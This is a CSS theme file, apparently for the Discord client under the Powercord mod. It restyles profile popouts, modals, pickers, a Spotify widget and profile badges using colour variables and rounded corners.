.customStatus-1bh2V9 {
    background: var(--Color004);
    padding: 16px 16px 16px 16px;
    text-align: left;
    line-height: 22px;
    margin-bottom: -20px;
}

/* Roles */

.role-2irmRk{

    position: relative;
    overflow: hidden;
    z-index: 1;
    border: none;
    padding: 5px;
}

.roleCircle-3xAZ1j::before{
    content: "";
    position: absolute;
    top:0;
    left:0;
    width:100%;
    height: 100%;
    background: inherit;
    opacity: .2;
    z-index: -1;
    pointer-events: none;
}

/* Note */

.textarea-2r0oV8::-webkit-scrollbar {
    width: 0px;
    height: 0px;
}


/* Footer */

.footer-1fjuF6 {
    padding: 0 16px 16px;
}

/* USRBG */

.reduce-motion .userPopout-3XzG_A {
	transform:translateZ(0);
}

.userPopout-3XzG_A .wrapper-3t9DeA::after {
    border-radius: var(--Radius001) var(--Radius001) 0 0;
	content: '';
	position: fixed;
	top: 0;
	left: 0;
    width: 260px;
    height: 174px;
	z-index: -1;
	pointer-events: none;
	opacity: 1;
	background-size: cover;
	background-repeat: no-repeat;
	background-position: var(--user-popout-position) center;
    background-image: var(--user-background);
    filter: brightness(50%) blur(0px);
}

.userPopout-3XzG_A  .header-2BwW8b,
.userPopout-3XzG_A  .scroller-2FKFPG,
.userPopout-3XzG_A  .footer-1fjuF6 {
	z-index: 1;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | User Profile |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Header */

.header-QKLPzZ {
    margin-bottom: 90px;
}

/* Activity */

.topSectionPlaying-1J5E4n {
    background: transparent;
}

.topSectionSpotify-1lI0-P {
    background: transparent;
}

.activity-1ythUs {
    background: var(--Color003);
}

/* Background */

.root-SR8cQa {
    border-radius: 24px;
	width: 900px;
    background-color: transparent;
}

.body-3ND3kc, .tabBarContainer-1s1u-z {
    background: var(--Color004);
}

.infoScroller-3EYYns {
    padding: 20px 12px 20px 12px;
}

/* Divider */

.userInfoSection-2acyCx+.userInfoSection-2acyCx {
    border: none;
}

/* Note */

.userInfoSectionHeader-CBvMDh {
    display: none;
    padding: 0px;
}

.note-QfFU8y {
    padding: 2px 12px 2px 12px;
    margin-right: 0px;
    margin-left: 0px;
    margin-bottom: -20px;
    margin-top: -20px;
}

.note-QfFU8y textarea {
    border-radius: 12px;
    font-size: 14px;
    line-height: 16px;
    padding: 4px;
}

/* Icon Tabs */

.connectedAccount-36nQx7 {
    z-index: 3;
    margin-top: 20px;
    margin-right: 12px;
    margin-left: 12px;
    padding: 8px 14px 8px 8px;
    width: 230px;
    background: var(--Color002);
	border-radius: 90px;
	border: none;
}

/* Spotify */

.assetsLargeImage-eYwpTX {
    border-radius: 90px;
    display: block;
    -o-object-fit: cover;
    object-fit: cover;
}

/* Buton */

.lookFilled-1Gx00P.colorGreen-29iAKY {
    background: var(--Color001);
    color: #fff;
}

.lookFilled-1Gx00P.colorGreen-29iAKY {

    background: var(--Color001);
    color: #fff;
}

/* USRBG */

.header-QKLPzZ .wrapper-3t9DeA::after {
    z-index: -1;
    content:'';
    position: absolute;
    top: -20px;
    left: -20px;
    width: 900px;
    height: 240px;
    opacity: 1;
    background: var(--user-background) center/cover no-repeat;
    background-color: var(--Color002);
    filter: brightness(60%) blur(0px);
  }




/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Verify Phone |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.phoneField-38N1bJ .countryButton-3xq3Ts {
    border-radius: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Pinbox |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.messagesPopoutWrap-1MQ1bW {
    border-radius: 24px;
    top: 10px;
    width: 900px;
}

.messageGroupWrapper-o-Zw7G {
    border-radius: 24px;
    margin: 12px;
}

.messagesPopout-24nkyi {
    padding: 0px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Inbox ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .header-2-Imhb .tabBar-1kuXvJ .tab-ck0077.active-1MbGPa {
    background-color: var(--Color001);
	border-radius: 90px;
}

.recentMentionsPopout-3rCiI6 {
    width: 35vw;
    max-width: 900px;
    min-width: 900px;
    max-height: 80vh;
}

.container-enaOkj {
    border-radius: 24px;
}

.container-3u944p {
	background: var(--Color004);
}

.icon-1Itzco {
    background-color: var(--Color003);
    border-radius: 80px;
    color: var(--text-muted);
    padding: 22px;
}

/* Unreads */

.icon-1Itzco {
    background-color: var(--Color003);
    border-radius: 80px;
    color: var(--text-muted);
    padding: 22px;
}

.stars-1YAEQv {
	display: none;
}

.size12-3cLvbJ {
    font-size: 13px;
    line-height: 16px;
}

/* Mention */

.guildIcon-3Co6k- {
    background-color: var(--Color002);
	border-radius: 90px;
}

.secondary-dIudih {
    background-color: var(--Color002);
    color: var(--Color008);
}

.container-3iAQ-0 {
    background-color: var(--Color005);
}


.channelHeader-3Gd2xq {
    background-color: var(--Color005);
}

.messageContainer-gbhlwo {
    background-color: var(--Color004);
    border-radius: 24px;
	padding: 0px;

}

.container-3iAQ-0 {
    margin-bottom: 0px;
    padding-left: 20px;
    padding-right: 20px;
}

.tertiary-aMXF0g {
    background-color: var(--Color002);
    color: var(--Color008);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Status Selection |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.menu-3sdvDG {
    border-radius: 20px;
}

.item-1tOPte {
    border-radius: 24px;
}

.description-2L932D {
    margin-bottom: 0px;
    font-size: 0px;
    line-height: 0px;

}

.scroller-3BxosC {
    padding: 8px 8px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Contex Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.wrapper-2aW0bm {
    background-color: var(--Color002);
    border-radius: 24px;
	box-shadow: var(--shadow001)
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Share Media ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */


.attachPopout-36hjtN {
    border-radius: 24px;
    background-color: var(--Color005);
    box-shadow: none;
}

.attachPopoutRow-3iqqu1 {
    border-radius: 90px;
    color: var(--Color008);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Search History |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.searchResultsWrap-3-pOjs {
    background-color: var(--Color003);
    width: 800px;
}

.searchResult-9tQ1uo:before {
    z-index: 1;
    top: 0;
    background-image: linear-gradient(0deg,#0000,var(--Color003));
}

.searchResult-9tQ1uo:after {
    bottom: 0;
    background-image: linear-gradient(180deg,#0000,var(--Color003));
}

.channelName-1JRO3C {
    background: var(--Color003);
}

.searchResultMessage-1fxgXh.hit-1fVM9e {
    background: var(--Color004);
    position: relative;
    z-index: 1;
    max-height: none;
	box-shadow: var(--shadow001);
    border: none;
    border-radius: 24px;
	padding-bottom: 20px;
	padding-top: 20px;
}

.searchResult-9tQ1uo.expanded-w_LCGl {
    background: var(--Color005);
    border-radius: 24px;
	border: none;
	padding-bottom: 20px;
	padding-top: 20px;
}

.expanded-w_LCGl .searchResultMessage-1fxgXh.hit-1fVM9e {
    background: var(--Color004);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Color Picker |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .colorPickerCustom-2CWBn2 {
    background: var(--Color004);
	border: none;
	box-shadow: var(--shadow001);
    border-radius: var(--Radius001);
}

.backdrop-1wrmKB {
	opacity: 0.1;
    background: #fff;
    transform: translateZ(0px);
}

.saturation-1FDvtn>div, .saturation-1FDvtn>div>div {
    border-radius: var(--Radius001);
}

.saturation-black {
    border-radius: 20px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Emoji Picker |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.inspector-S2gM3e {
    background-color: var(--Color005);
}

.contentWrapper-SvZHNd {
    background: var(--Color005);
    border-radius: 24px;
	padding-bottom: 40px;
    height: 111%;
	box-shadow: none;
}

.positionContainer-DEuh7X {
    height: 444px;
    z-index: 2;
}

.theme-dark .wrapper-1-Fsb8 {
    background: var(--Color005);
	border-radius: 24px;
}

/* Search */

.container-2XeR5Z {
    background-color: var(--Color004);
	border-radius: 90px;
}

.input-3Xdcic {
    background-color: var(--Color004);
	border-radius: 90px;
}

/* Header */

.inspector-sdLnLS {
    background: var(--Color003);
	border-radius: 24px;
}

/* Button */

.navButtonActive-1MkytQ {
    background-color: var(--Color001);
    color: #fff;
}

/* Icon */

.categoryItemDefaultCategorySelected-_HCKoz, .categoryItemDefaultCategorySelected-_HCKoz:hover {
    background-color: var(--Color003);
	border-radius: 90px;

}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Autocomplete |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.theme-dark .autocomplete-1vrmpx {
    background: var(--Color005);
    bottom: calc(100% - 8px);
    border-radius: 24px;
    box-shadow: none;
	padding-bottom: 48px;
	margin-bottom: -42px;
	z-index: 1;
}

/* Header */

:root .contentTitle-2tG_sM {
    color: var(--Color006);
}

/* Selector */

.theme-dark .selected-1Tbx07 {
    background: var(--Color003);
	border-radius: 90px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Create Channel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .modal-yWgWj- {
    background-color: var(--Color003);
    box-shadow: none;
	border-radius: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Reaction Emoji Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.emojiPicker-3PwZFl {
    background-color: var(--Color005);
    border-radius: 24px;
    box-shadow: none;
	border: none;
}

/* Inspector */

.inspector-sdLnLS {
    background: var(--Color005);
    border-radius: 24px;
}

/* Emoji */

.unicodeShortcut-15J8Ck {
    color: var(--Color008);
    height: 56px;

}

.emojiItem-14v6tW.emojiItemSelected-1aLkfV {
    background: var(--Color002);
    border-radius: 90px;
}

.guildIcon-3h-1IH {
    background: var(--Color002);
	border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Upload  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .uploadModal-2ifh8j {
    background: var(--Color003);
    border-radius: 24px;
    box-shadow: none;
}

.theme-dark .footer-3mqk7D {
    background: var(--Color005);
    border-radius: 0 0 24px 24px;
    box-shadow: none;
}


.uploadModal-2ifh8j .inner-3nWsbo .file-34mY5K .icon-kyxXVr.image-2yrs5j {
    margin-top: -33px;
    margin-left: 16px;
    margin-right: 16px;
    width: 104px;
    height: 104px;
    background-color: #fff;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    border-radius: 90px;
    background-size: contain;
    -webkit-box-shadow: 0 2px 8px rgba(0,0,0,.4);
    box-shadow: 0 2px 8px rgba(0,0,0,.4);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Delete Message ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .message-2qRu38 {
    background-color: var(--Color004);
    border: none;
    box-shadow: none;
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Create a Server  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-light .root-1gCeng {
    background: var(--Color003);
    box-shadow: none;
}

.theme-light .footer-2gL1pp {
    background: var(--Color005);
    box-shadow: none;
}

.lookFilled-1Gx00P.colorGrey-2DXtkV {
    color: var(--Color006);
    background: var(--Color001);
}

/* Button */

.lookFilled-1Gx00P.colorGrey-2DXtkV:hover {
    color: var(--Color006);
    background: var(--Color001);
    filter: brightness(120%);
}

/* Template */

.itemContainer-1LSFks {
    border-radius: 24px;
    border: none;
    background: var(--Color004);
    margin-bottom: 12px;
}

.templatesList-2E6rTe {
    margin-top: 24px;
    padding: 0px 12px 12px 12px;
    height: 330px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Set a custom status  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Select Server Region  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-dark .regionSelectModal-12e-57 {
    background: var(--Color004) !important;
}

/* Header Text */

.regionSelectModal-12e-57 .regionSelectModalHeader-21khC1 {
    color: var(--Color007);
    margin-bottom: 20px;
}

/* Buttons */

.theme-dark .regionSelectModalOption-2DSIZ3 {
    background: var(--Color003);
    border: none;
    border-radius: 90px;
}

.theme-dark .regionSelectModalOption-2DSIZ3:hover {
    background: var(--Color002);
    border: none;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Add Game Popout  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.addGamePopout-2RY8Ju .actions-3wcPyD {
    -webkit-box-pack: end;
    -ms-flex-pack: end;
    justify-content: flex-end;
    margin-top: 12px;
}

.theme-dark .addGamePopout-2RY8Ju {
    background: var(--Color003);
    border-radius: 24px;
    border: none;
    box-shadow: var(--shadow001);

}




/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Region  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*  Background*/

.regionSelectPopout-p9-0_W {
    direction: ltr;
    box-shadow: var(--shadow001);
}

.theme-dark .quickSelectPopout-X1hvgV {
    background: var(--Color004);
    border-radius: 12px;
    position: relative;
    left: -4px;
}

.quickSelectPopoutOption-opKBx9 {
    padding-left: 40px;
    padding-right: 0px;
}

/*  flag */

.regionSelectFlag-1htPow {
    background-color: var(--Color001);
    border-radius: var(--Radius001);
}

/*  Region Text */

.regionSelectName-c5qL8O {
    direction: rtl;
    text-align: left;
    height: 20px;
    font-size: 14px;
    line-height: 20px;
    margin-right: -20px;
}

/*  Check */

.check-2by_h9 {
    position: relative;
    width: 16px;
    height: 12px;
    left: -136px;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Add Server   ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.circleIconButton-jET_ig.selected-ugP_am {
    color: var(--Color006);
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Search Menu   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .option-96V44q:after {
    background: none;
}

.theme-dark .option-96V44q.selected-rZcOL- {
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

.theme-dark .container-3ayLPN {
    background: var(--Color004);
    border-radius: var(--Radius001);
    box-shadow: var(--shadow001);
}

.theme-dark .option-96V44q.selected-rZcOL-:after {
    background: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | View Server as Role |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.notice-1tZwqv {
    background: var(--Color001);
    color: var(--Color006);
    height: 40px;
    margin: 12px 12px 0px 12px;
    border-radius: var(--Radius002);
}

/* Disable Button */

.button-3Ijpww:hover {
    background-color: var(--Color001);
    filter: brightness(110%) ;
}

/* Menu */

.container-3LUQwT {

    background: var(--Color005);
    border-radius: var(--Radius001);

    max-width: 200px;
    -webkit-box-shadow: var(--shadow001);
    box-shadow: var(--shadow001);
}

/* Checkbox */

.iconContainer-1zobSR {
    border: 1.6px solid var(--Color007);
    border-radius: var(--Radius002);

}

.iconContainer-1zobSR.checked-1Fij_T {
    background: var(--Color001);
    border-color: var(--Color001);
}

.role-3ulsK-:hover {
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Powercord | Spotify Modal ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.powercord-spotify {
    position: fixed;
    z-index: 2;
    bottom: 24px;
    right: 12px;
    width: 236px;
}

/* Advanced Controls */

.spotify-extra-controls {
    background: var(--Color005);
    border-radius: 24px;
    position: fixed;
    padding-top: 12px;
    padding-bottom: 50px;
    margin-bottom: 20px;
    bottom: 20px;
    width: 236px;
}

/* Buttons */

.powercord-spotify > .container-3baos1:hover button.button-14-BFJ{
    display: block;
}

.powercord-spotify > .container-3baos1 button[aria-checked="false"],
.powercord-spotify > .container-3baos1 button:not([role="switch"]) {
    display: none;
}

/* Seek Bar Progress */

.powercord-spotify .spotify-extra-controls + .spotify-seek {
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}

.powercord-spotify .spotify-seek {
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
    }


.powercord-spotify .spotify-seek:hover {
    background: var(--Color005);
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}

/* Buttons */

.powercord-spotify > .spotify-seek:hover button.spotify-seek-bar-progress{
    display: block;
}

.powercord-spotify > .spotify-seek button[aria-checked="false"],
.powercord-spotify > .spotify-seek button:not([role="switch"]) {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Add-Ons | White Profile Badges |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.header-QKLPzZ .powercord-badge-cutie img:first-child{display: none !important}
.header-QKLPzZ .powercord-badge-cutie img:last-child{display:block!important}
[class^="profileBadge-2BqF-Z powercord-badge-"]{color:white!important}
[class*="BadgeStaff"]{filter: brightness(10)!important}
[class*="BadgePartner"]{filter: brightness(10)!important}
[class*="BadgeHypesquad-"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse1"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse2"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse3"]{filter: brightness(10)!important}
[class*="BadgeBugHunter"]{filter: brightness(10)!important}
[class*="BadgeVerifiedDeveloper"]{filter: brightness(10)!important}
[class*="BadgeEarlySupporter"]{background-image:url("/assets/ce15562552e3d70c56d5408cfeed2ffd.svg")!important}
[class*="BadgePremium"]{background-image:url("/assets/379d2b3171722ef8be494231234da5d1.svg")!important}
[class*="GuildSubscriberlvl1"]{background-image:url("/assets/a86d7e56b8208da9f8623ac49fe822dc.svg")!important}
[class*="GuildSubscriberlvl2"]{background-image:url("/assets/e85361cd599b6722548c5a5f003b4b78.svg")!important}
[class*="GuildSubscriberlvl3"]{background-image:url("/assets/7a0be61e754af3353d0871070f46a9d6.svg")!important}
[class*="GuildSubscriberlvl4"]{background-image:url("/assets/88f960f400930f109847d0335685de69.svg")!important}
[class*="GuildSubscriberlvl5"]{background-image:url("/assets/a99def5f819c077e5e5061cab741b7e6.svg")!important}
[class*="GuildSubscriberlvl6"]{background-image:url("/assets/2cfb317f3db3963d8ded9a97ee967bac.svg")!important}
[class*="GuildSubscriberlvl7"]{background-image:url("/assets/278736f579d810b11ddf308cb598b19e.svg")!important}
